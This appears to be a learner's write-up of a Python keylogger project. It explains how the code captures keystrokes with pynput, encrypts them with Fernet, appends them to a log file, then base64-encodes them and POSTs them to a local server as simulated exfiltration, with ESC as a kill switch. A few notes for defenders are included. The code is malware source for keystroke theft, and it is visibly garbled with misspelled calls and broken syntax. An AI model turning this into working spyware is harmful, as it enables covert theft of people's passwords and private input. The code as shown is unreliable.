Keylogger Project
A keylogger is a Program or tool which is used to capture keystrokes.As well as I had used encrypted data Exfilteration.
Exfiltration is a process of transfer of sensitive information from a computer system or network an external destination. 
Exfiltration is actually just same as data theft where attackers aim to extract values data for malicious purposes.
Here following libraries are used for following purposes:-

import os->for file system operation (like checking if the key file exists).

from pynput import Keyboard->Pynput is a library which is used to control and monitor input devices such as keyboard and mouse.From this I included Keyboard for monitoring keyboard.For capturing and Listening to
keytrokes on the system.
From cryptograppy fernet import ferner->This Library provides a secure and easy to use symmetric encryption scheme Here fernet is an encryption algorithom.
import base 64-> for encoding the encrypted data to safely send over the network
import datetime-> For generating timestamp for log entries.
import requests->for sending HTTP POST requests (simulating exfiltration).

Fernet:
The scheme used here is fernet.
Fernet is a symmetric encryption scheme provided by the cryptography library in Python. It is designed to be a secure and user-friendly way to encrypt and decrypt data.
->key File='encryption_key.key':Defines a filename to save or load the encryption key.
->if os.path.exists (key_File):Checks if encryption key file exists.
->with open (Key_File,'rb') as f: If exists, open the key file in binary read mode.
->Key=f.read(): Read the saved fernet key from fik.
->else:If the key file does not exist, generate one.
->Key = Fernet. generate_key()
→ with open (key_File,'wb') as f:creates a new key file for writing the newly generated key.
->f.write (KEY):saves the key to a file for writing the newly generated key.
->fernet = Fernet (KEY):Initializes the zernet encryption/decryption instance with the key.
->Log_File = "keys.txt":Sets the filename where encrypted keystore will be stored.
->KILL_SWITCH=keyboard Key.esc:Sets the ESC key as the kill switch which when pressed will stop logging.

Note:Malware often has kill switches for testing. Analysts can search for these as potential weak points to terminate execution.

Writing Encrypted Logs
Prepare a log entry with timestamp + keystrokes Encrypts it with Fernet.
Writes encrypted data to file
Base64 encodes it and exfilterates by POSTING to a server
Note:I was confused here Log-data is not a pre-defined paramater.It is actually taken that while Calling function we pass the real arguments.
Code->
def
Write_encrypted_logo(log-data):
      timestamp=datetime.datetime.utconow().isofformat()
      log = f"{timestamp}:{log_data}\n"
      enc_log = ferrnet.encrypt (log.encode) 
      with open (LOG_FILE, "ab") as f:
           f.write (enc_log +b'\n')
#simulate exfiltration
b64_ence_log = base64.64 encode(enc_log).decode()
requests.port('http://127.0.0.1:5000/recieve'),
data = {'data': b64_enc_log}
Note:
Defenders should monitor Post traffu to unknown servers and scan for encrypted data leaving endpoints.

Keylogger Listener
def on_press(key):
     try:
        write_encrypted_log(str(key.char))
     except AttributeError:
        write_encrypted_log (str(key))
      if key==KILL_SWITCH:
           #end listener
           return False
Listener=keyboard. Listener(on_press=on_press)
listener.start()
listener.join()
def on_press(key):Defines the callback function that is triggered every time a key is pressed.The key parameter represent the key that was pressed.

